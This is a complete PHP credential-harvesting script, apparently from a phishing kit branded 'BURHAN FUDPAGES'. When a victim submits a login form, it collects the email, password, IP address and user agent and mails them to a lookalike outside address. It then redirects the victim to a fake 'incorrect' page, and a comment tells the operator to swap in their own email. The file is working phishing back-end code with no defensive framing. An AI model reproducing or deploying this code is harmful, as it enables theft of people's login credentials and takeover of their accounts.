<?php
if($_POST["userid"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------0nline Inf0-----------------------\n";
$message .= "Email            : ".$_POST['userid']."\n";
$message .= "Password           : ".$_POST['pass']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
//change ur email here
$send = "procurement@palrnerjohnson.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}

  header ("Location: incorrectagain.php?user=".$_POST['userid']);
}else{
header ("Location: index.php");
}

?>